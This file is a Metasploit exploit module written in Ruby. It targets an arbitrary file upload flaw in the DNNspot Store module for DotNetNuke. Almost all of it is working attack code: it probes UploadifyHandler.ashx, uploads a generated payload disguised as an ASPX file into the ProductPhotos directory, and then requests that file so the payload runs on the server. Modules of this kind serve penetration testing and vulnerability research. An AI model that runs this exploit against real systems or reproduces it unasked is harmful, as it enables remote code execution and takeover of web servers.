require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DotNetNuke DNNspot Store (UploadifyHandler.ashx) <= 3.0.0 Arbitary File Upload',
      'Description'    => %q{
        This module exploits an arbitrary file upload vulnerability found in DotNetNuke DNNspot Store
    module versions below 3.0.0.
      },
      'Author'         =>
        [
          'Glafkos Charalambous <glafkos.charalambous[at]unithreat.com>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://metasploit.com' ]
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Privileged'     => false,
      'Targets'        =>
        [
          [ 'DNNspot-Store / Windows', {} ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 21 2014'))
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri("DesktopModules/DNNspot-Store/Modules/Admin/UploadifyHandler.ashx")
    })

    if res and res.code == 200
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    @payload_name = "#{rand_text_alpha_lower(8)}.aspx"
    exe  = generate_payload_exe
    aspx  = Msf::Util::EXE.to_exe_aspx(exe)
    post_data = Rex::MIME::Message.new
    post_data.add_part(aspx, "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"#{@payload_name}\"")
    post_data.add_part("/DesktopModules/DNNspot-Store/ProductPhotos/", nil, nil, "form-data; name=\"folder\"")
    post_data.add_part("1", nil, nil, "form-data; name=\"productId\"")
    post_data.add_part("w00t", nil, nil, "form-data; name=\"type\"")
    data = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    print_status("#{peer} - Uploading payload...")
    res = send_request_cgi({
      "method" => "POST",
      "uri"    => normalize_uri("DesktopModules/DNNspot-Store/Modules/Admin/UploadifyHandler.ashx"),
      "data"   => data,
      "ctype"  => "multipart/form-data; boundary=#{post_data.bound}"
    })

    unless res and res.code == 200
      fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
    end

    register_files_for_cleanup(@payload_name)

    print_status("#{peer} - Executing payload #{@payload_name}")
    res = send_request_cgi({
    'method' => 'GET',
      'uri'    => normalize_uri("/DesktopModules/DNNspot-Store/ProductPhotos/",@payload_name)
    })
  end
end
